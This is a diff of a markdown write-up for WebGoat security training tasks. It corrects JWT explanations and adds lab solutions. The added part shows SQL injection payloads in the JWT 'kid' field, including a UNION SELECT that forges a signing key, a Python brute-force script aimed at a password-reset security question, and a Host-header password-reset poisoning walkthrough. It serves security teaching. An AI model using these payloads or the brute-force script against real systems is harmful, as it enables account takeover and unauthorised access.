@@ -47,13 +47,13 @@ provide confidentiality in a conversation.
 
 JWT Tokens are designed for the following two use cases:
 
-- **Authorization**: When a user logs in, they get a JWT Token as a response. This token is valid for a certain amount of time and can be send in an HTTP/S request to authenticate instead of using the provided credentials. Single sign on also makes use of these Tokens.
-- **Information Exchange**: JWT Tokens are signed taking both the header and payload into account, with ensures that nothing has been tampered with.
+- **Authorization**: When a user logs in, they get a JW-Token as a response. This token is valid for a certain amount of time and can be send in an HTTP/S request to authenticate instead of using the provided credentials. Single sign on also makes use of these tokens.
+- **Information Exchange**: JW-Tokens are signed taking both the header and payload into account, which ensures that nothing has been tampered with.
 
 ## Task 4
 
-A JWT token is made up of a header, payload, and signature for varifcation.
-All data that is part of one of these tokens is written with JSON and encoded with Bas64.
+A JW-Token is made up of a header, payload, and signature for verification.
+All data that is part of one of these tokens is written with JSON and encoded with Base64.
 The three strings that result from this are then appended together, separated by dots.
 
 ```
@@ -63,7 +63,7 @@ Header.Payload.Signature
 ### Header
 
 The header consists of the type of the token, which is always `JWT`.
-It has one more field to sepcify the signing algorithm that wsa used for it.
+It has one more field to specify the signing algorithm that was used for it.
 
 ```json
 {
@@ -82,11 +82,11 @@ eyJhbGciOiJSU0EiLCJ0eXAiOiJKV1QifQ==
 
 The payload itself is made up of three individual parts:
 
-- **Registered Claims**: Recommended section to provide claims about issurer (`iss`), expiration time (`exp`), subject (`sub`), audience (`aud`) and more.
+- **Registered Claims**: Recommended section to provide claims about issuer (`iss`), expiration time (`exp`), subject (`sub`), audience (`aud`) and more.
 - **Public Claims**: These claims can be set freely.
 - **Private Claims**:  Custom claims that are to be shared between the involved parties and are neither registered claims nor public claims.
 
-This could be, what such a payload looks like:
+This could be what such a payload looks like:
 
 ```json
 {
@@ -104,16 +104,16 @@ eyJpc3MiOiJtZSIsIm5hbWUiOiJUb210b20iLCJhZG1pbiI6ImZhbHNlIn0=
 
 ### Signature
 
-The signature is created using the Base64 encoded header, payload and a secret. Each field will be appended
+The signature is created using the Base64 encoded header, payload and a secret.
+Note that the padding of the Base64-encoded strings is removed.
 
 ```
-Header  : eyJhbGciOiJSU0EiLCJ0eXAiOiJKV1QifQ==
-Payload : eyJpc3MiOiJtZSIsIm5hbWUiOiJUb210b20iLCJhZG1pbiI6ImZhbHNlIn0=
+Header  : eyJhbGciOiJSU0EiLCJ0eXAiOiJKV1QifQ
+Payload : eyJpc3MiOiJtZSIsIm5hbWUiOiJUb210b20iLCJhZG1pbiI6ImZhbHNlIn0
 Secret  : 6162636465666768696a6b6c6d6e6f70
 ```
 
 The tool `openssl` can be used to create this signature:
-Note that the padding of the Base64-encoded strings is removed.
 
 ```bash
 echo -n 'eyJhbGciOiJSU0EiLCJ0eXAiOiJKV1
@@ -365,10 +365,10 @@ For this reason, refresh tokens need to be much better secured then the access t
 It is also rather important to keep track of what refresh token belongs to what access token, as this can otherwise be abused by an adversary to use a compromised, low privilege refresh token to
 request a high privilege access token.
 
-Another problem is the storage location of the refresh token. Since it has to be stored in the same location as the access token, compromising the later often also means
+Another problem is the storage location of the refresh token. Since it has to be stored in the same or a similar location as the access token, compromising the later often also means
 gaining control over the other.
 
-Refresh tokens should be stored in a hashed for if they are used for vaidation.
+Refresh tokens should be stored in a hashed format on the server side if they are used for vaidation.
 
 ## Task 14
 
@@ -380,9 +380,6 @@ Requirements were access to an expired token of this target user and *any* valid
 Since the server did not check whether the refresh token and access token belonged to the same user,
 requesting a refresh of the expired access token of the target user with the refresh token of the attacking user would
 grant the attacker an access token for the target user.
-
-Remediation is especially complicated in this case, since blacklisting or revoking a refresh token would not prevent the attacker from
-performing the same attack from another newly created account.
 
 Remediation is especially complicated in this case, since blacklisting or revoking a refresh token would not prevent the attacker from
 performing the same attack from another newly created account.
@@ -412,3 +409,286 @@ Insert the token into the original requests `Authorization` header.
 After submitting the request, the task should be complete.
 
 ![Update the original request](.img/broken_auth_t10_3.png)
+
+## Task 16
+
+First, intercept the request that is send out when pressing one of the "*Delete*" buttons.
+This request should contain Jerry's JWT.
+
+Next, enter the token into [jwt.io](https://jwt.io).
+Change the name from "*Jerry*" to "*Tom*".
+
+After this, look at the KID.
+Through error based SQLi probing, it is possible to figure out that this field
+is vulnerable to such attacks.
+
+Proof:
+
+Entering any string that is not `webgoat_key` will result in a return code of 500 when submitting
+the request with the new token.
+
+Entering the string `webgoat_key';--` will only not result in any error, but lead to the same request as entering `webgoat_key`.
+
+Entering the string `webgoat' AND 1=1;--` will also compute without a server error.
+Another working example is `nopynope' OR 1=1;--`.
+
+This solidifies the assumption that the manually inserted SQL statements are not part of the
+string that is actually queried for in the database, as this should lead to a `500 - Internal Server Error` response.
+
+Time based SQLi is not possible and leads to a `500` error, confirmed with the following injection:
+
+```
+webgoat_key' AND sleep(10);--
+```
+
+The SQL query returns a single value.
+This can be confirmed with these statements:
+
+```
+webgoat_key' ORDER BY 1;--    This one works
+webgoat_key' ORDER BY 2;--    This one fails -> only one column
+```
+
+Since the KID is presumably used to fetch a signing key from a database to verify the tokens signature
+on the server-side, it might be possible to inject a custom signing key.
+The basic syntax for this would look like this:
+
+```
+nonexistant_key' UNION SELECT 'injected_key' FROM 'unknown_table';--
+```
+
+To make the development of the exact payload easier, [SQL Fiddle](http://sqlfiddle.com) will be used.
+It is enough to roughly simulate what the real database *may* look like, which can be guessed based
+on the results of the previous enumeration.
+
+```sql
+CREATE TABLE IF NOT EXISTS `Unknown` (
+  `kid` varchar(200) NOT NULL,
+  `secret` varchar(200) NOT NULL,
+  PRIMARY KEY (`kid`)
+) DEFAULT CHARSET=utf8;
+
+INSERT INTO `Unknown` (`kid`, `secret`) VALUES
+('webgoat_key', 'secret');
+```
+
+![SQL Fiddle Database Setup](.img/jwt_sqli_1.png)
+
+While setting up this database does not necessarily help with finding the correct payload, it
+can be used to verify that the syntax of any SQL statements is correct.
+
+With this, a statement is crafted that can return a custom string instead of the
+database entry associated with the KID `webgoat_id`
+For the table, one if the `INFORMATION_SCHEMA` ones is used, since it is guranteed that every database has this table.
+
+```sql
+nopynope' UNION SELECT 'mykeynow' FROM INFORMATION_SCHEMA.TABLES;--
+```
+
+The corresponding token was created with [jwt.io](https://jwt.io).
+
+![JWT KID UNION SELECT Injection](.img/jwt_sqli_2.png)
+
+This solves the task.
+
+![JWT KID Injection Solution](.img/jwt.sqli_3.png)
+
+## Task 17
+
+The website likely stores the password in a hashed format before sending it to the user in question.
+Usually, it is also immediatley erased after use and should in the best case also
+only be valid for a limited timeframe.
+
+The password also is unlikely to give access to the accout directly and should only provide the
+abilitly to set a new password for it.
+
+This analysis was performed by searching the internet for password reset email security practices.
+
+## Task 18
+
+CAPTCHAs, or "**C**ompletely **a**utomatic **p**ublic **T**uring test to tell **c**omputers and **h**umans **a**part" present challenges to the visitor of a website that are very difficult to perform
+automatically but are, or should be, easily feasable by a human being.
+
+This could be a piece of text that has been warped and has to be typed out, the selection of
+images containing a certain object and other, less popular approaches.
+
+## Task 19
+
+Starting out, the task will be solved without a Python script.
+The result can then be used to verify that the script functions correctly.
+
+### Password Reset - Section 4
+
+First, intercept the request that is send out when pressing the "*Submit*" button.
+Load the request into Burpsuites Intruder module.
+
+Highlight the value of the security question and press `Add`.
+This will mark the string as the property that will be attacked.
+
+![Burpsuite Intruder Setup Step 1](.img/passwword_reset_t4_1.png)
+
+Then, ChatGPT is used to generate a wordlist containing differnent names of colors.
+
+```txt
+red
+green
+blue
+yellow
+orange
+purple
+pink
+turquoise
+brown
+gray
+black
+white
+magenta
+cyan
+lavender
+maroon
+teal
+navy
+olive
+silver
+```
+
+This list can be loaded into Intruder as the payload by copying the wordlist
+and pressing the "*Paste*" button in the "*Payloads*" tab.
+
+![Burpsuite Intruder Setup Step 2](.img/password_reset_t4_2.png)
+
+Attack the website by pressing the "*Start Attack*" button in the top right.
+Filtering the output by response size, the correct color can quickly be identified.
+It is `green`.
+
+![Burpsuite Intruder Attack](.img/password_reset_t4_3.png)
+
+### Python Script
+
+```python
+# Copyright Thomas Gingele https://github.com/B1TC0R3
+
+import argparse
+import requests
+
+def get_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        prog="A bruteforce script for a specific hacking challenge.",
+        epilog="Copyright Thomas Gingele https://github.com/B1TC0R3"
+    )
+
+    parser.add_argument(
+        "-w",
+        "--wordlist",
+        help="the wordlist",
+        required=True
+    )
+
+    parser.add_argument(
+        "-u",
+        "--url",
+        help="the file containing the HTTP request to use",
+        required=True
+    )
+
+    parser.add_argument(
+        "-b",
+        "--body",
+        help="the body of the request. The string '^ATK^' will be replaced with the wordlist content for each request",
+        required=True
+    )
+
+    parser.add_argument(
+        "-s",
+        "--session",
+        help="the session token",
+        required=False
+    )
+
+    parser.add_argument(
+        "-t",
+        "--contenttype",
+        help="the value of the content type header",
+        default="application/x-www-form-urlencoded",
+        required=False
+    )
+
+    return parser.parse_args()
+
+
+def main():
+    response  = None
+    payload   = None
+    prev_size = None
+
+    args      = get_args()
+    useragent = 'Bruteforcer' 
+    atk       = '^ATK^'
+    color     = "\033[31m"
+
+    with open(args.wordlist, 'r') as wordlist:
+        while word := wordlist.readline().strip():
+            payload = args.body.replace(atk, word).strip()
+
+            response = requests.post(
+                args.url,
+                headers={
+                    'Content-Length': str(len(payload)),
+                    'Content-Type': args.contenttype,
+                    'User-Agent': useragent,
+                },
+                cookies={'JSESSIONID': args.session},
+                data=payload,
+            )
+
+            if (len(response.content) != prev_size):
+                if (color == "\033[0m"):
+                    color = "\033[31m"
+                else:
+                    color = "\033[0m"
+
+            print(f"{color}Status: {response.status_code} | Size: {len(response.content)} | Word: {word}\033[0m")
+
+            prev_size = len(response.content)
+            response.close()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+This script will also finds the word `green` leading to a different result then all other words.
+
+![Password Reset Python Script Results](.img/password_reset_t4_4.png)
+
+Alternatively, the script can be called with `rockyou.txt` as the wordlist,
+which will lead to the same result, but take longer.
+
+![Password Reset Script with rockyou.txt](.img/password_reset_t4_5.png)
+
+## Task 20
+
+a reset link needs to be:
+
+- completely unique
+- only be available for a single use
+- have a limited time of life
+
+## Task 21
+
+Navigate to the password reset form and enter Toms email.
+Intercept the request send by pressing the "*Continue*" button in the password reset form.
+Then, change the `Host` header to the address and port of your web proxy, in this case
+WebWolf was used.
+
+![Intercept Password Reset Request](.img/password_reset_t6_1.png)
+
+Navigate to WebWolfs "*Incoming requests*" tab and check the request that was just send to it.
+It will contain the reset link.
+
+![Read the Password Reset Link](.img/password_reset_t6_2.png)
+
+Navigate to `http://localhost:8080/WebGoat/PasswordReset/reset/reset-password/<id>` where
+`<id>` is copied from the previous web request. Reset the password.
+
+After this, it is possible to log in as Tom with the newly set password.
